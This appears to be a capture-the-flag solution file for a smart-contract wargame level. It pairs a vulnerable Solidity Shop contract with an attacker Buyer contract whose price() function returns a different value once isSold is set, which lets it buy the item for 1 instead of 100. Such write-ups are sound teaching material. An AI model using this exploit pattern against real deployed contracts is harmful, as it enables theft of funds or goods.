/*

This example illustrates the nuances involved when a function uses just an implementer interface without knowing the actual function definition behind it

The buy function in Shop seems to have written correctly, but some tricks can force it into being vulnerable. The price() function that it calls is completely controlled out of the contract and the Buyer contract can implement the function in any way it wants

We will use this vulnerability along with the publicly defined variables (also another vulnerability to get the piece at a cheaper price, thus changing the price variable to 1

*/

// Get the Elevator contract address from console
contract.address;
// Use this to populate addr field in solidity


/* === Solidity code
// Deployed and Tested in Remix
// Deploy Buyer contract and call the callBuy() function

===

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}

contract Buyer {
  Shop s;
  address ss = 0xBc4791b1517D9A1de9a5068cf432727A5DC78158;

  // We will use the public isSold variable to manipulate the return value of price() function
  // If the item is unsold yet, price() will return originalPrice
  // If the item is marked sold it will return hackedPrice
  // This manipulation is possible because the item is marked sold before the price is updated
  uint originalPrice = 100;
  uint hackedPrice = 1;
  
  constructor() {
    s = Shop(ss);
  }

  function price() external view returns(uint) {
    if(s.isSold()) return hackedPrice;
    return originalPrice;
  }

  // Call the buy function in Shop
  function callBuy() public {
    s.buy();
  }
}

*/
